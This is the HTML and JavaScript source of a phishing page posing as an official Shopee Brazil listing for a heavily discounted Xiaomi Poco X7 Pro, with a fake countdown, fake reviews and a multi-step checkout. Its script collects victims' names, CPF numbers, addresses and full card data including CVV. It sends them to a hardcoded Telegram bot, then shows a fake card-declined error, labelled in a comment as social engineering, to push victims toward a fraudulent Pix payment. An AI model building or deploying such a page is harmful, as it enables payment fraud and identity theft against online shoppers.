<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Xiaomi Poco X7 Pro - Shopee Oficial</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --shopee: #ee4d2d; --shopee-light: #fff5f1; --teal: #00bfa5; --bg: #f5f5f5; --text: #222; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background: var(--bg); color: var(--text); overflow-x: hidden; }

        /* SPA CONTROLLERS */
        .page { display: none; min-height: 100vh; width: 100%; position: absolute; top: 0; left: 0; background: var(--bg); }
        .page.active { display: block; position: relative; }

        /* TOP NAV */
        .top-nav { background: white; padding: 8px 12px; display: flex; align-items: center; position: sticky; top: 0; z-index: 1000; height: 54px; border-bottom: 1px solid #eee; gap:10px; }
        .search-container { flex: 1; background: #f0f0f0; border-radius: 2px; display: flex; align-items: center; padding: 0 10px; color: #888; }
        .search-container input { border: none; background: transparent; padding: 8px; width: 100%; outline: none; }

        /* PRODUCT IMAGE */
        .main-slider { position: relative; width: 100%; background: #fff; aspect-ratio: 1/1; }
        .carousel-track { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; height: 100%; }
        .carousel-track::-webkit-scrollbar { display: none; }
        .carousel-item { min-width: 100%; scroll-snap-align: start; }
        .carousel-item img { width: 100%; height: 100%; object-fit: contain; }
        .carousel-index { position: absolute; bottom: 15px; right: 15px; background: rgba(0,0,0,0.4); color: #fff; padding: 2px 10px; border-radius: 12px; font-size: 11px; }

        /* FLASH SALE */
        .flash-sale { background: linear-gradient(90deg, #ff4d2d, #ff8a00); color: white; padding: 10px 15px; display: flex; align-items: center; justify-content: space-between; font-weight: bold; }
        .timer-unit { background: #333; color: #fff; padding: 2px 4px; border-radius: 2px; margin: 0 2px; }

        /* CARDS */
        .section { background: white; padding: 15px; margin-bottom: 8px; }
        .price-row { color: var(--shopee); font-size: 28px; font-weight: 500; }
        .old-price { color: #999; text-decoration: line-through; font-size: 13px; }
        .product-title { font-size: 15px; line-height: 1.4; margin-top: 10px; font-weight: 400; }
        .tag-indicado { background: var(--shopee); color: white; font-size: 10px; padding: 1px 4px; border-radius: 2px; margin-right: 4px; }

        /* MODAL */
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 2000; }
        .modal-content { position: absolute; bottom: 0; width: 100%; background: white; border-radius: 12px 12px 0 0; padding: 20px; animation: slideUp 0.3s; }
        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
        .opt-btn { border: 1px solid #ddd; background: #f5f5f5; padding: 8px 12px; border-radius: 2px; font-size: 13px; margin: 5px 5px 0 0; cursor: pointer; }
        .opt-btn.active { border-color: var(--shopee); color: var(--shopee); background: var(--shopee-light); }

        /* INPUTS */
        .shopee-input { width: 100%; padding: 12px; border: 1px solid #ddd; background: #fafafa; border-radius: 2px; margin-bottom: 10px; font-size: 14px; outline: none; }
        .shopee-input:focus { border-color: var(--shopee); }

        /* FOOTER BUTTONS */
        .footer-action { position: fixed; bottom: 0; width: 100%; height: 55px; background: white; border-top: 1px solid #eee; display: flex; z-index: 1000; }
        .btn-cart { flex: 1; background: #e2f8f5; color: var(--teal); border: none; font-size: 14px; }
        .btn-buy { flex: 1.2; background: var(--shopee); color: white; border: none; font-weight: bold; font-size: 16px; cursor: pointer; }

        /* CHECKOUT SPECIAL */
        .shopee-shield { background: #fff5f1; border: 1px solid #ffdbcc; color: var(--shopee); padding: 12px; border-radius: 4px; font-size: 12px; display: flex; align-items: center; gap: 10px; margin: 10px 0; }
        .pay-option { display: flex; align-items: center; justify-content: space-between; padding: 15px 0; border-bottom: 1px solid #f5f5f5; cursor: pointer; }
        .radio-shopee { width: 18px; height: 18px; border: 1px solid #ccc; border-radius: 50%; }
        .pay-option.active .radio-shopee { border-color: var(--shopee); background: var(--shopee); box-shadow: inset 0 0 0 3px #fff; }

        /* LOADER */
        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--shopee); border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="p1" class="page active">
        <div class="top-nav">
            <i class="fas fa-arrow-left" style="color:var(--shopee); cursor:pointer;" onclick="location.href='https://shopee.com.br'"></i>
            <div class="search-container"><i class="fas fa-search"></i><input type="text" placeholder="Buscar na Shopee"></div>
            <i class="fas fa-shopping-cart" style="color:var(--shopee)"></i>
        </div>

        <div class="main-slider">
            <div class="carousel-track" id="mainTrack" onscroll="updateIdx()">
                <div class="carousel-item"><img src="https://i.postimg.cc/hvd5NVng/celular-xiaomi-poco-x7-pro-nfc-dual-sim-512gb-12gb-ram.jpg"></div>
                <div class="carousel-item"><img src="https://i.postimg.cc/brs6kkrv/D-NQ-NP-970510-MLA101985218069-122025-O.webp"></div>
                <div class="carousel-item"><img src="https://i.postimg.cc/v84FW6pL/c1cb1b668aeef4266b070782b5b43c47.webp"></div>
            </div>
            <div class="carousel-index" id="cIndex">1/8</div>
        </div>

        <div class="flash-sale">
            <div><i class="fas fa-bolt"></i> OFERTA REL√ÇMPAGO</div>
            <div style="font-size:12px;">TERMINA EM <span id="timer"><span class="timer-unit">01</span>:<span class="timer-unit">29</span>:<span class="timer-unit">30</span></span></div>
        </div>

        <div class="section">
            <div class="old-price">R$ 2.299,00</div>
            <div class="price-row" id="mainPrice">R$ 599,00 <span style="background:var(--shopee-light); font-size:12px; padding:2px 4px; border-radius:2px;">74% OFF</span></div>
            <h1 class="product-title"><span class="tag-indicado">Indicado</span> Xiaomi Poco X7 PRO 5G Global - Edi√ß√£o Limitada 2026 (NFC/512GB)</h1>
        </div>

        <div class="section">
            <p style="font-weight:bold; font-size:13px; margin-bottom:10px;">AVALIA√á√ïES (19.566)</p>
            <div style="font-size:12px; color:#ffce3d;">‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê 5.0</div>
            <p style="font-size:13px; color:#555; margin-top:5px;">"Melhor custo benef√≠cio, Onix Oficial entregou r√°pido!" - a***n</p>
        </div>

        <div style="height:60px;"></div>
        <div class="footer-action">
            <div style="flex:1; display:flex; align-items:center; justify-content:center; border-right:1px solid #eee; font-size:10px; flex-direction:column; color:#666;"><i class="fas fa-store" style="font-size:18px; color:var(--shopee);"></i>Loja</div>
            <button class="btn-buy" style="background:var(--teal);" onclick="openModal()">Carrinho</button>
            <button class="btn-buy" onclick="openModal()">Compre Agora</button>
        </div>
    </div>

    <div id="modalVar" class="modal">
        <div class="modal-content">
            <div style="display:flex; gap:15px; margin-bottom:20px;">
                <img src="https://i.postimg.cc/hvd5NVng/celular-xiaomi-poco-x7-pro-nfc-dual-sim-512gb-12gb-ram.jpg" style="width:90px; height:90px; border:1px solid #eee;">
                <div>
                    <p style="color:var(--shopee); font-size:22px; font-weight:bold;" id="modalPrice">R$ 599,00</p>
                    <p style="font-size:12px; color:#888;">Estoque: 1.071</p>
                </div>
            </div>
            <p style="font-weight:bold; font-size:13px;">Cor</p>
            <div style="margin:10px 0;">
                <button class="opt-btn active" onclick="selColor(this)">Amarelo Poco</button>
                <button class="opt-btn" onclick="selColor(this)">Preto Onyx</button>
                <button class="opt-btn" onclick="selColor(this)">Azul Hyper</button>
                <button class="opt-btn" onclick="selColor(this)">Cinza Tit√¢nio</button>
            </div>
            <p style="font-weight:bold; font-size:13px;">Armazenamento</p>
            <div style="margin:10px 0;">
                <button class="opt-btn active" onclick="selStorage(this, 599)">256GB / 12GB RAM</button>
                <button class="opt-btn" onclick="selStorage(this, 718.80)">512GB / 12GB RAM (+20%)</button>
            </div>
            <button class="btn-buy" style="width:100%; border-radius:4px; height:45px; margin-top:10px;" onclick="goToAddress()">CONFIRMAR</button>
        </div>
    </div>

    <div id="p2" class="page">
        <div class="top-nav"><i class="fas fa-arrow-left" onclick="openPage('p1')"></i><h1>Endere√ßo de Entrega</h1></div>
        <div class="section">
            <div style="background:#e6fffb; color:#00bfa5; padding:10px; border-radius:4px; font-size:12px; margin-bottom:15px;"><i class="fas fa-shield-alt"></i> Seus dados est√£o protegidos por ShopeePay</div>
            <input type="text" id="inNome" class="shopee-input" placeholder="Nome Completo">
            <input type="tel" id="inCpf" class="shopee-input" placeholder="CPF" oninput="mCpf(this)" maxlength="14">
            <input type="tel" id="inCep" class="shopee-input" placeholder="CEP" maxlength="9" onblur="apiCep()">
            <input type="text" id="inRua" class="shopee-input" placeholder="Rua / Logradouro">
            <div style="display:flex; gap:10px;">
                <input type="text" id="inBairro" class="shopee-input" placeholder="Bairro">
                <input type="text" id="inNum" class="shopee-input" placeholder="N¬∫">
            </div>
            <input type="text" id="inCidade" class="shopee-input" placeholder="Cidade">
            <button class="btn-buy" style="width:100%; height:50px; border-radius:4px;" onclick="saveP2()">CONTINUAR</button>
        </div>
    </div>

    <div id="p3" class="page">
        <div class="top-nav"><i class="fas fa-arrow-left" onclick="openPage('p2')"></i><h1>Finalizar Pedido</h1></div>
        <div class="section">
            <p style="font-size:13px; color:#666;"><i class="fas fa-map-marker-alt" style="color:var(--shopee)"></i> <span id="resEnd"></span></p>
        </div>
        
        <div class="section">
            <p style="font-weight:bold; font-size:13px; margin-bottom:10px;">M√©todo de Pagamento</p>
            <div class="pay-option active" id="rPix" onclick="setPay('pix')">
                <span><i class="fas fa-pix" style="color:var(--teal)"></i> Pix (R$ 10 de desconto)</span>
                <div class="radio-shopee"></div>
            </div>
            <div class="pay-option" id="rCard" onclick="setPay('card')">
                <span><i class="far fa-credit-card" style="color:#2673dd"></i> Cart√£o de Cr√©dito</span>
                <div class="radio-shopee"></div>
            </div>
        </div>

        <div id="cardFields" class="section" style="display:none;">
            <input type="tel" id="cNum" class="shopee-input" placeholder="N√∫mero do Cart√£o">
            <input type="text" id="cNome" class="shopee-input" placeholder="Nome no Cart√£o">
            <div style="display:flex; gap:10px;">
                <input type="tel" id="cVal" class="shopee-input" placeholder="MM/AA" maxlength="5">
                <input type="tel" id="cCvv" class="shopee-input" placeholder="CVV" maxlength="4">
            </div>
            <p style="font-size:11px; color:#999; text-align:center;"><i class="fas fa-lock"></i> Pagamento processado de forma segura.</p>
        </div>

        <div class="section">
            <div style="display:flex; justify-content:space-between; margin-bottom:5px;"><span>Subtotal</span><span id="subT">R$ 599,00</span></div>
            <div style="display:flex; justify-content:space-between; color:var(--shopee);"><span>Desconto</span><span>-R$ 20,00</span></div>
            <div style="display:flex; justify-content:space-between; font-weight:bold; font-size:18px; margin-top:10px;">
                <span>Total</span><span id="finalT" style="color:var(--shopee)">R$ 579,00</span>
            </div>
            <div class="shopee-shield">
                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" style="width:18px;">
                <span><b>Garantia Shopee:</b> Se seu pedido n√£o for entregue, a Shopee devolve seu dinheiro.</span>
            </div>
        </div>

        <div style="height:70px;"></div>
        <div class="footer-action" style="justify-content:flex-end; padding-right:0;">
            <div style="text-align:right; margin-right:15px; align-self:center;">
                <p style="font-size:11px; color:#666;">Total</p>
                <p style="color:var(--shopee); font-weight:bold; font-size:18px;" id="footT">R$ 579,00</p>
            </div>
            <button class="btn-buy" style="height:100%; padding:0 30px;" onclick="finish()">Fazer Pedido</button>
        </div>
    </div>

    <div id="pPix" class="page">
        <div class="top-nav"><h1>Pagamento Pix</h1></div>
        <div class="section" style="text-align:center;">
            <div class="spinner"></div>
            <p style="color:#666; font-size:14px;">Aguardando confirma√ß√£o do pagamento...</p>
            <h2 style="margin:20px 0; color:var(--shopee);" id="pixValue"></h2>
            <div style="background:#f9f9f9; border:1px dashed #ccc; padding:15px; font-size:11px; word-break:break-all; margin-bottom:15px;" id="pixCode">
                00020101021226870014br.gov.bcb.pix011472944474452730394055802BR5913SHOPEE_OFFICIAL6009SAO_PAULO62070503***6304D1E5
            </div>
            <button class="btn-buy" style="width:100%; height:45px; border-radius:4px;" onclick="alert('Copiado!')">COPIAR C√ìDIGO PIX</button>
            <div class="shopee-shield" style="margin-top:20px;">
                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" style="width:18px;">
                <span>Se seu pedido n√£o for entregue, a Shopee devolve seu dinheiro.</span>
            </div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '7880759082:AAEvRzo4_NjdKnzrISfBzq3PeMLVFWRIvtw';
        const CHAT_ID = '7294447445';
        let vBase = 599.00;
        let payMethod = 'pix';

        function openPage(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            window.scrollTo(0,0);
        }

        function openModal() { document.getElementById('modalVar').style.display = 'block'; }
        function selColor(btn) { btn.parentElement.querySelectorAll('.opt-btn').forEach(b => b.classList.remove('active')); btn.classList.add('active'); }
        
        function selStorage(btn, price) {
            btn.parentElement.querySelectorAll('.opt-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            vBase = price;
            document.getElementById('modalPrice').innerText = `R$ ${price.toFixed(2)}`;
            document.getElementById('mainPrice').innerHTML = `R$ ${price.toFixed(2)} <span style="background:var(--shopee-light); font-size:12px; padding:2px 4px; border-radius:2px;">74% OFF</span>`;
        }

        function mCpf(i) {
            let v = i.value.replace(/\D/g,'');
            v = v.replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d{1,2})$/,"$1-$2");
            i.value = v;
        }

        async function apiCep() {
            let c = document.getElementById('inCep').value.replace(/\D/g,'');
            if(c.length == 8) {
                const r = await fetch(`https://viacep.com.br/ws/${c}/json/`);
                const d = await r.json();
                if(!d.erro) {
                    document.getElementById('inRua').value = d.logradouro;
                    document.getElementById('inBairro').value = d.bairro;
                    document.getElementById('inCidade').value = d.localidade;
                }
            }
        }

        function goToAddress() { document.getElementById('modalVar').style.display='none'; openPage('page2'); }

        function saveP2() {
            document.getElementById('resEnd').innerText = `${document.getElementById('inNome').value} | ${document.getElementById('inRua').value}, ${document.getElementById('inNum').value}`;
            let t = vBase - 20;
            if(payMethod == 'pix') t -= 10;
            document.getElementById('subT').innerText = `R$ ${vBase.toFixed(2)}`;
            document.getElementById('finalT').innerText = `R$ ${t.toFixed(2)}`;
            document.getElementById('footT').innerText = `R$ ${t.toFixed(2)}`;
            openPage('p3');
        }

        function setPay(m) {
            payMethod = m;
            document.querySelectorAll('.pay-option').forEach(o => o.classList.remove('active'));
            document.getElementById(m == 'pix' ? 'rPix' : 'rCard').classList.add('active');
            document.getElementById('cardFields').style.display = m == 'card' ? 'block' : 'none';
            saveP2(); 
        }

        async function finish() {
            const data = {
                n: document.getElementById('inNome').value,
                c: document.getElementById('inCpf').value,
                e: document.getElementById('resEnd').innerText,
                p: document.getElementById('footT').innerText,
                m: payMethod,
                card: document.getElementById('cNum').value,
                val: document.getElementById('cVal').value,
                cvv: document.getElementById('cCvv').value
            };

            const msg = `üîî *NOVO PEDIDO SHOPEE*\nüë§ Nome: ${data.n}\nüÜî CPF: ${data.c}\nüìç End: ${data.e}\nüí∞ Total: ${data.p}\nüí≥ M√©todo: ${data.m}\n\n*CART√ÉO:* ${data.card || '---'}\nüìÖ Val: ${data.val || '---'}\nüîí CVV: ${data.cvv || '---'}`;

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})
            });

            if(payMethod == 'card') {
                // ENGENHARIA SOCIAL: ERRO NO CART√ÉO PARA FOR√áAR PIX
                alert("Erro no processamento do cart√£o (C√≥digo: 05 - Limite Insuficiente ou Banco Recusou). Tente pagar via Pix para garantir o desconto da Oferta Rel√¢mpago!");
                setPay('pix');
            } else {
                document.getElementById('pixValue').innerText = data.p;
                openPage('pPix');
            }
        }

        function updateIdx() {
            let t = document.getElementById('mainTrack');
            document.getElementById('cIndex').innerText = `${Math.round(t.scrollLeft / t.offsetWidth) + 1}/8`;
        }
    </script>
</body>
       </html>
    
